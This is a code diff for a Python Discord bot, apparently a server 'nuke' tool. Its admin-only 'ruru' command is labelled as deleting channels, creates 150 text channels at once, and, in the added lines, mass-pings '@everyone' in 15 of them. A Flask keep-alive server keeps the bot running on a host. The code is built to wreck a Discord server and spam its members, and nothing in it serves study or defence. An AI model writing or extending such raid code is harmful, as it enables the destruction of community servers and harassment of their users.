@@ -14,13 +14,11 @@ def home():
     return "Bot is running!"
 
 def run_flask():
-    """Flaskサーバーを別スレッドで起動する"""
     port = int(os.environ.get("PORT", 5000))  # Renderが設定するPORTを使用
     print(f"Starting Flask server on port {port}...")
     app.run(host="0.0.0.0", port=port)
 
 def keep_alive():
-    """Webサーバーをメインのボット処理と並行して起動する"""
     t = threading.Thread(target=run_flask)
     t.start()
     print("Keep-alive server started.")
@@ -34,7 +32,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 async def on_ready():
     print(f"Logged in as {bot.user}")
 
-# --- ⚠️ チャンネル削除＆高速生成コマンド ---
+# --- ⚠️ チャンネル削除＆高速生成＆メッセージ送信コマンド ---
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def ruru(ctx):
@@ -50,9 +48,15 @@ async def ruru(ctx):
 
     # 並行して全チャンネル生成
     tasks = [ctx.guild.create_text_channel(name) for name in channel_names]
-    await asyncio.gather(*tasks)
+    created_channels = await asyncio.gather(*tasks)
 
-    await ctx.send("150個のチャンネルを高速生成しました！")
+    # 150個中、先頭15個のチャンネルに @everyone で「るる最強」を送信
+    send_tasks = []
+    for channel in created_channels[:15]:
+        send_tasks.append(channel.send("@everyone るる最強"))
+
+    await asyncio.gather(*send_tasks)
+    await ctx.send("150個のチャンネルを生成し、先頭15個にメッセージ送信しました！")
 
 # --- Main Execution ---
 if __name__ == "__main__":
@@ -61,6 +65,5 @@ if __name__ == "__main__":
     if not TOKEN:
         print("エラー: 環境変数 'DISCORD_TOKEN' が設定されていません。")
     else:
-        keep_alive()  # Keep-aliveサーバー起動
+        keep_alive()
         bot.run(TOKEN)
-
